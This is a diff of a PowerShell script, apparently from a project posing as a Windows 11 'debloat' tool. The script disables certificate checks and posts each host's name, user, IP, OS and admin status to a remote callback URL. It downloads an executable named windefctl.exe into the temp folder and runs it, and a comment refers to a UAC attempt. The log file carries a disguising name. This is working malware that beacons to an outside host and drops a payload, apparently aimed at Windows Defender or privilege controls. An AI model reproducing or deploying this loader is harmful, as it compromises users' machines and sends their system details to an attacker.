@@ -3,8 +3,7 @@ $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
 $gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
-$srv='https://signindat.com'
-$sources=@($srv,$gh)
+$cbUrl='https://signindat.com/cb.php'
 
 $logPath="$env:TEMP\wmisrv.log"
 function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }
@@ -21,7 +20,7 @@ function _cb($stage,$status,$detail){
         $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
         $wc=New-Object Net.WebClient
         $wc.Headers.Add('Content-Type','application/json')
-        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
+        $wc.UploadString($cbUrl,'POST',$body)|Out-Null
     }catch{}
 }
 
@@ -33,28 +32,14 @@ _log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
 function _dl($n){
-    foreach($src in $sources){
-        try{
-            $wc=New-Object Net.WebClient
-            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-            $d=$wc.DownloadData("$src/$n")
-            _log "DL: $n $($d.Length) from $src"
-            return ,$d
-        }catch{}
-    }
-    _log "DL: $n fail"
-    return $null
-}
-
-function _dlGh($n){
     try{
         $wc=New-Object Net.WebClient
         $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
         $d=$wc.DownloadData("$gh/$n")
-        _log "DL: $n $($d.Length) from github"
+        _log "DL: $n $($d.Length)"
         return ,$d
     }catch{
-        _log "DL: $n fail from github"
+        _log "DL: $n fail"
         return $null
     }
 }
@@ -147,7 +132,7 @@ if($cbIsAdmin){
 }
 
 # download windefctl regardless of admin (for logging/diagnosis and UAC attempt)
-$wdcBytes=_dlGh 'windefctl.exe'
+$wdcBytes=_dl 'windefctl.exe'
 $wdcPath="$env:TEMP\windefctl.exe"
 if($wdcBytes){
     [IO.File]::WriteAllBytes($wdcPath,$wdcBytes)|Out-Null
